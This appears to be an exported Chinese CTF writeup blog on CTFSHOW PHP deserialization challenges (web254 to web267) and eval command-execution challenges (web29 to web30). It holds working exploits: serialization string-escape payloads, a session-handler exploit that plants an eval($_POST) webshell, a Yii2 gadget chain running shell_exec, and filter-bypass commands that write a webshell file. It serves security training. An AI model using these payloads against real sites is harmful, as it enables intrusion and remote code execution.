31__debugInfo()，打印所需调试信息 web254 1\u0026lt;?php 2 3 ?\u0026gt;\u0026#39;; 4 public $code=\u0026#39;xrntkk\u0026#39;; 5} 6 7$poc = new ctfshowvip(); 8echo urlencode(serialize($poc)); web262 字符串逃逸\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 02:37:19 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 16:05:38 9# @message.php 10# @email: h1xa@ctfer.com 11# @link: https://ctfer.com 12 13*/ 14 15 16error_reporting(0); 17class message{ 18 public $from; 19 public $msg; 20 public $to; 21 public $token=\u0026#39;user\u0026#39;; 22 public function __construct($f,$m,$t){ 23 $this-\u0026gt;from = $f; 24 $this-\u0026gt;msg = $m; 25 $this-\u0026gt;to = $t; 26 } 27} 28 29$f = $_GET[\u0026#39;f\u0026#39;]; 30$m = $_GET[\u0026#39;m\u0026#39;]; 31$t = $_GET[\u0026#39;t\u0026#39;]; 32 33if(isset($f) \u0026amp;\u0026amp; isset($m) \u0026amp;\u0026amp; isset($t)){ 34 $msg = new message($f,$m,$t); 35 $umsg = str_replace(\u0026#39;fuck\u0026#39;, \u0026#39;loveU\u0026#39;, serialize($msg)); 36 setcookie(\u0026#39;msg\u0026#39;,base64_encode($umsg)); 37 echo \u0026#39;Your message has been sent\u0026#39;; 38} 39 40highlight_file(__FILE__); message.php\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 15:13:03 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 15:17:17 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13highlight_file(__FILE__); 14include(\u0026#39;flag.php\u0026#39;); 15 16class message{ 17 public $from; 18 public $msg; 19 public $to; 20 public $token=\u0026#39;user\u0026#39;; 21 public function __construct($f,$m,$t){ 22 $this-\u0026gt;from = $f; 23 $this-\u0026gt;msg = $m; 24 $this-\u0026gt;to = $t; 25 } 26} 27 28if(isset($_COOKIE[\u0026#39;msg\u0026#39;])){ 29 $msg = unserialize(base64_decode($_COOKIE[\u0026#39;msg\u0026#39;])); 30 if($msg-\u0026gt;token==\u0026#39;admin\u0026#39;){ 31 echo $flag; 32 } 33} 我们的目的就是想办法让token等于admin\n信息传输的过程中使用的序列化和反序列化，存在字符串逃逸，通过逃逸我们可以使token=admin\n之前写过我就懒得重新写了\nhttps://ctf.show/writeups/706838\n首先先生成一段序列\n1\u0026lt;?php 2class message{ 3 public $from; 4 public $msg; 5 public $to = \u0026#39;123\u0026#39;; 6 public $token=\u0026#39;admin\u0026#39;; 7 8} 9$payload = new message(); 10echo serialize($payload); 11 12O:7:\u0026#34;message\u0026#34;:4:{s:4:\u0026#34;from\u0026#34;;N;s:3:\u0026#34;msg\u0026#34;;N;s:2:\u0026#34;to\u0026#34;;s:3:\u0026#34;123\u0026#34;;s:5:\u0026#34;token\u0026#34;;s:5:\u0026#34;admin\u0026#34;;} 截取后面一部分作为to的值传入\npayload:\n?f=\u0026amp;m=\u0026amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\u0026#34;;s:5:\u0026#34;token\u0026#34;;s:5:\u0026#34;admin\u0026#34;;} web263 访问/www.zip拿到源码\n审计代码我们可以在/inc/inc.php中找到这样一个危险方法\n假如username和password可控，我们就可以写入木马\n但是这是一个__destruct方法，想要触发必须要经过反序列化，那这道题哪里有进行反序列的地方呢\n文章 - 带你走进PHP session反序列化漏洞 - 先知社区\n这篇文章讲得很详细\n归根结底这个漏洞之所以存在是由于序列化和反序列化时使用的处理器不同造成的\nsession.serialize_handler定义的引擎有三种，如下表所示：\n处理器名称 存储格式 php 键名 + 竖线 + 经过serialize()函数序列化处理的值 php_binary 键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值 php_serialize 经过serialize()函数序列化处理的数组 注：自 PHP 5.5.4 起可以使用 php_serialize\n这道题的php版本为7.3.11，默认使用的处理器为php_serialize\n而在/inc/inc.php中却设置处理器为php\n也就是说序列化和反序列化所使用的处理器不同\n所以我们可以根据php处理器的格式构造出payload\nexp：\n1\u0026lt;?php 2 3class User{ 4 public $username; 5 public $password; 6 function __construct(){ 7 $this-\u0026gt;username = \u0026#39;1.php\u0026#39;; 8 $this-\u0026gt;password = \u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39;; 9 } 10} 11 12echo urlencode(base64_encode(\u0026#39;|\u0026#39;.serialize(new User()))); 13 14?\u0026gt; 我们将cookie中的limit修改为我们序列化后的结果\n/index.php\n1\tif(isset($_SESSION[\u0026#39;limit\u0026#39;])){ 2\t$_SESSION[\u0026#39;limti\u0026#39;]\u0026gt;5?die(\u0026#34;登陆失败次数超过限制\u0026#34;):$_SESSION[\u0026#39;limit\u0026#39;]=base64_decode($_COOKIE[\u0026#39;limit\u0026#39;]); 3\t$_COOKIE[\u0026#39;limit\u0026#39;] = base64_encode(base64_decode($_COOKIE[\u0026#39;limit\u0026#39;]) +1); 4\t}else{ 5\tsetcookie(\u0026#34;limit\u0026#34;,base64_encode(\u0026#39;1\u0026#39;)); 6\t$_SESSION[\u0026#39;limit\u0026#39;]= 1; 7\t} 修改后访问/check.php进行反序列化\n最后访问/log-1.php\n成功写入\nweb264 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 02:37:19 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 16:05:38 9# @message.php 10# @email: h1xa@ctfer.com 11# @link: https://ctfer.com 12 13*/ 14 15 16error_reporting(0); 17session_start(); 18 19class message{ 20 public $from; 21 public $msg; 22 public $to;1 23 public function __construct($f,$m,$t){ 24 $this-\u0026gt;from = $f; 25 $this-\u0026gt;msg = $m; 26 $this-\u0026gt;to = $t; 27 } 28} 29 30$f = $_GET[\u0026#39;f\u0026#39;]; 31$m = $_GET[\u0026#39;m\u0026#39;]; 32$t = $_GET[\u0026#39;t\u0026#39;]; 33 34if(isset($f) \u0026amp;\u0026amp; isset($m) \u0026amp;\u0026amp; isset($t)){ 35 $msg = new message($f,$m,$t); 36 $umsg = str_replace(\u0026#39;fuck\u0026#39;, \u0026#39;loveU\u0026#39;, serialize($msg)); 37 $_SESSION[\u0026#39;msg\u0026#39;]=base64_encode($umsg); 38 echo \u0026#39;Your message has been sent\u0026#39;; 39} 40 41highlight_file(__FILE__); message.php\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 15:13:03 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 15:17:17 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13session_start(); 14highlight_file(__FILE__); 15include(\u0026#39;flag.php\u0026#39;); 16 17class message{ 18 public $from; 19 public $msg; 20 public $to; 21 public $token=\u0026#39;user\u0026#39;; 22 public function __construct($f,$m,$t){ 23 $this-\u0026gt;from = $f; 24 $this-\u0026gt;msg = $m; 25 $this-\u0026gt;to = $t; 26 } 27} 28 29if(isset($_COOKIE[\u0026#39;msg\u0026#39;])){ 30 $msg = unserialize(base64_decode($_SESSION[\u0026#39;msg\u0026#39;])); 31 if($msg-\u0026gt;token==\u0026#39;admin\u0026#39;){ 32 echo $flag; 33 } 34} 这题是修复了web262的非预期解，也就是可以直接在message.php修改cookie进行反序列化\n所以解法同web262\npayload:\n?f=1\u0026amp;m=1\u0026amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\u0026#34;;s:5:\u0026#34;token\u0026#34;;s:5:\u0026#34;admin\u0026#34;;} 注意要在message.php的cookie中加上msg=1\nweb265 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-04 23:52:24 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-05 00:17:08 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15include(\u0026#39;flag.php\u0026#39;); 16highlight_file(__FILE__); 17class ctfshowAdmin{ 18 public $token; 19 public $password; 20 21 public function __construct($t,$p){ 22 $this-\u0026gt;token=$t; 23 $this-\u0026gt;password = $p; 24 } 25 public function login(){ 26 return $this-\u0026gt;token===$this-\u0026gt;password; 27 } 28} 29 30$ctfshow = unserialize($_GET[\u0026#39;ctfshow\u0026#39;]); 31$ctfshow-\u0026gt;token=md5(mt_rand()); 32 33if($ctfshow-\u0026gt;login()){ 34 echo $flag; 35} 这题指针引用使password恒等于token即可\nexp\n1\u0026lt;?php 2 class ctfshowAdmin{ 3 public $token; 4 public $password; 5 6 public function __construct($t,$p){ 7 $this-\u0026gt;token=$t; 8 $this-\u0026gt;password = $p; 9 } 10 } 11 $a = new ctfshowAdmin(\u0026#34;我能打上海major\u0026#34;,\u0026#34;全场欢呼！DANKING！DANKING！\u0026#34;); 12 $a-\u0026gt;password = \u0026amp;$a-\u0026gt;token; 13 echo urlencode(serialize($a)); web266 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-04 23:52:24 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-05 00:17:08 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14highlight_file(__FILE__); 15 16include(\u0026#39;flag.php\u0026#39;); 17$cs = file_get_contents(\u0026#39;php://input\u0026#39;); 18 19 20class ctfshow{ 21 public $username=\u0026#39;xxxxxx\u0026#39;; 22 public $password=\u0026#39;xxxxxx\u0026#39;; 23 public function __construct($u,$p){ 24 $this-\u0026gt;username=$u; 25 $this-\u0026gt;password=$p; 26 } 27 public function login(){ 28 return $this-\u0026gt;username===$this-\u0026gt;password; 29 } 30 public function __toString(){ 31 return $this-\u0026gt;username; 32 } 33 public function __destruct(){ 34 global $flag; 35 echo $flag; 36 } 37} 38$ctfshowo=@unserialize($cs); 39if(preg_match(\u0026#39;/ctfshow/\u0026#39;, $cs)){ 40 throw new Exception(\u0026#34;Error $ctfshowo\u0026#34;,1); 41} php大小写不敏感，大小写绕过\nexp\n1\u0026lt;?php 2class Ctfshow{ 3 4} 5echo serialize(new Ctfshow()); O:7:\u0026#34;Ctfshow\u0026#34;:0:{} web267 考点：Yii2 反序列化漏洞\n有一个登录入口\n弱口令成功登入admin/admin\n在/index.php?r=site%2Fabout处查看源代码看到hint\n访问/index.php?r=site%2Fabout\u0026amp;view-source\n题目给出了入口点\n从源码中我们可以知道这道题用的是yii框架，而且为2.0版本\nyii反序列化漏洞复现及利用_yii框架漏洞-CSDN博客\n直接用poc总感觉缺了点什么，那自己搓一搓吧，但是过程就不放在这里了\n\u0026lt;?php\rnamespace yii\\rest{\rclass IndexAction{\rpublic $checkAccess;\rpublic $id;\rpublic function __construct(){\r$this-\u0026gt;checkAccess = \u0026#39;shell_exec\u0026#39;;\r$this-\u0026gt;id = \u0026#39;cat /flag | tee 1\u0026#39;;//命令执行\r}\r}\r}\rnamespace Faker {\ruse yii\\rest\\IndexAction;\rclass Generator\r{\rprotected $formatters;\rpublic function __construct()\r{\r$this-\u0026gt;formatters[\u0026#39;close\u0026#39;] = [new IndexAction(), \u0026#39;run\u0026#39;];\r}\r}\r}\rnamespace yii\\db{\ruse Faker\\Generator;\rclass BatchQueryResult{\rprivate $_dataReader;\rpublic function __construct()\r{\r$this-\u0026gt;_dataReader=new Generator();\r}\r}\r}\rnamespace{\ruse yii\\db\\BatchQueryResult;\recho base64_encode(serialize(new BatchQueryResult()));\r} 没回显，用tee将输出复制到1文件中\npayload\n?r=backdoor/shell\u0026amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YV\rJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaV\rxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxNzoiY2F0IC9mbGFnIHwgdGVlID\rEiO31pOjE7czozOiJydW4iO319fX0= ","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","summary":"\u003ch4 id=\"php的魔法方法\"\u003ePHP的魔法方法\u003c/h4\u003e\n\u003cp\u003ePHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-scss\" data-lang=\"scss\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__construct\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e类的构造函数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 2\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 3\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__destruct\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e类的析构函数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 4\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 5\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__call\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e在对象中调用一个不可访问方法时调用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 7\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__callStatic\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e用静态方式中调用一个不可访问方法时调用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 8\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 9\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__get\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e获得一个类的成员变量时调用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e10\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e11\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__set\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e设置一个类的成员变量时调用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e12\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e13\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__isset\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e当对不可访问属性调用isset\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e或empty\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e时调用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e14\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e15\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__unset\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e当对不可访问属性调用unset\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e时被调用\u003c/span\u003e\u003cspan class=\"err\"\u003e。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e16\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e17\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__sleep\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e执行serialize\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e时\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e先会调用这个函数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e18\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e19\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__wakeup\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e执行unserialize\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e时\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e先会调用这个函数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e20\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e21\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__toString\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e类被当成字符串时的回应方法\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e22\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e23\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__invoke\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e调用函数的方式调用一个对象时的回应方法\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e24\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e25\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__set_state\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e调用var_export\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e导出类时\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e此静态方法会被调用\u003c/span\u003e\u003cspan class=\"err\"\u003e。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e26\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e27\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__clone\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e当对象复制完成时调用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e28\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e29\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__autoload\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e尝试加载未定义的类\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e30\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e31\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__debugInfo\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003e，\u003c/span\u003e\u003cspan class=\"nt\"\u003e打印所需调试信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"web254\"\u003eweb254\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e2\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e3\u003c/span\u003e\u003cspan class=\"cl\"\u003e                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                \u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e4\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e    public $code=\u0026#39;xrntkk\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e5\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e7\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e$poc = new ctfshowvip();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e8\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003eecho urlencode(serialize($poc));\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"web262\"\u003eweb262\u003c/h4\u003e\n\u003cp\u003e字符串逃逸\u003c/p\u003e","title":"CTFSHOW-反序列化-Writeup"},{"content":"web29 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:26:48 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 可以看到通过eval函数可以执行php代码或者系统命令，其中过滤了flag。\n进行绕过就行，解法很多\nc=system(\u0026ldquo;cat fl*g.php | grep -E \u0026lsquo;fl.g\u0026rsquo; \u0026ldquo;);\nc=system(\u0026ldquo;tac fl*g.php\u0026rdquo;);\nc=system(\u0026ldquo;cat fl*g.php\u0026rdquo;);（用cat要右键查看源代码才能看到回显）\nc=system(\u0026ldquo;cp fl*g.php a.txt \u0026ldquo;);（访问a.txt查看）\nc=system(\u0026rsquo;echo -e \u0026quot; \u0026lt;?php \\n error_reporting(0); \\n $c= $_GET['c']; \\n eval($c); \u0026quot; \u0026gt; a.php\u0026rsquo;); //直接新建一个页面并写入一句话木马 （/a.php?c=system(\u0026ldquo;tac flag.php\u0026rdquo;);）\n?c=echo `tac fla*`;\n\u0026hellip;.\nweb30 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:42:26 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|system|php/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 